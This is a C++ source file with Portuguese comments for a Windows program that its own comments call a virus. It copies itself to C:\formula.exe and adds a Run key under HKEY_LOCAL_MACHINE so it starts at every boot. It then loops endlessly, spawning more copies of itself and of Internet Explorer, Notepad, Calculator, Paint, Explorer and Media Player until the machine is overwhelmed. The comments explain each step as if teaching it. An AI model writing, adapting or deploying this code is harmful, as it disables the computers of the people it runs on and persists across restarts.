//bibliotecas.

#include <iostream>
#include <Windows.h>
#include <lmcons.h>
#include <stdio.h>
#include <stdlib.h>
#include <locale.h>
#include <string>

//bibliotecas.

using namespace std; //Se você não usasse esse using namespace std quase todas as funções ou classes da biblioteca padrão que você usasse você teria que colocar um std:: antes, std::cout, std::cin... isso serve para te poupar de ficar digitando tanto e tornar o código mais legível.


//pega o diretorio do proprio aquivo. 
//dir seria o diretorio do arquivo.
string dir() {
    char buffer[MAX_PATH];
    GetModuleFileName( NULL, buffer, MAX_PATH );
    string::size_type pos = string( buffer ).find_last_of( "\\/" );
    return string( buffer ).substr( 0, pos);
}

//----------------------------------

int main(){
	
	//essa parte copia o arquivo formula.exe para o disco local C:.
	
	string copia = "copy ";
	
	copia += dir(); //concatena o diretorio com a string copy.
		
	copia += "\\formula.exe c:\\formula.exe"; //concatena a parte de cima com o resto do comando para copia.
	
	system(copia.c_str()); //executa o comando que esta na variavel copia, o comando system e o comando do sistema obviamente no caso o PROMPT DE COMANDO. 
	
	//------------------------------------------------------------
	
	//essa parte cria uma chave de registro (Auto RUN)
		
	string cmd = "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /v formula /d c:\\formula.exe";  
		
	system(cmd.c_str()); //executa o comando que esta na variavel cmd.
	
	//----------------------------------------------------------------------------------------------------------------------------------
		
	int black=0; //variavel do tipo inteira definida como 0. 
		
	setlocale(LC_ALL, "Portuguese"); //define o local. 
		
	SetConsoleTitle("formula"); //define o titulo.
	
	//loop infinito para ficar abrindo os programas respectivos.
		
	while(black<1){//no caso a variavel black esta definida como 0 e no while nao contem um incremento na respectiva variavel,com isso a variavel vai ser sempre 0 tornando a condicao do while sempre falsa e repetindo o processo infinitamente 
		
		//inicia o proprio virus 5x.
		system("start formula.exe");
		system("start formula.exe");
		system("start formula.exe"); 
		system("start formula.exe"); 
		system("start formula.exe"); 
		//inicia o proprio virus.
		
		 //inicia o internet explorer 5x.
		system ("start iexplore");
		system ("start iexplore");
		system ("start iexplore");
		system ("start iexplore");
		system ("start iexplore");
		 //inicia o internet explorer.
		 
		 // inicia o bloco de notas 5x.
		system ("start notepad");
		system ("start notepad");
		system ("start notepad");
		system ("start notepad");
		system ("start notepad");
		// inicia o bloco de notas.  
		
		//inicia a calculadora 5x.
		system ("start calc");
		system ("start calc");
		system ("start calc");
		system ("start calc");
		system ("start calc");
		//inicia a calculadora. 
		
		//inicia o paint 5x.
		system ("start mspaint"); 
		system ("start mspaint"); 
		system ("start mspaint"); 
		system ("start mspaint"); 
		system ("start mspaint"); 
		//inicia o paint.
		
		//inicia o gerenciador de arquivos 5x.
		system ("start explorer"); 
		system ("start explorer");
		system ("start explorer");
		system ("start explorer");
		system ("start explorer");	
		//inicia o gerenciador de arquivos.
		
		//inicia o windows midia player 5x.
		system ("start wmplayer");
		system ("start wmplayer");
		system ("start wmplayer");
		system ("start wmplayer");
		system ("start wmplayer"); 
		//inicia o windows midia player.
		
		//inicia o proprio virus 5x.
		system("start c://formula.exe");
		system("start c://formula.exe");
		system("start c://formula.exe"); 
		system("start c://formula.exe"); 
		system("start c://formula.exe"); 
		//inicia o proprio virus
		
	}
		
return 0;
}


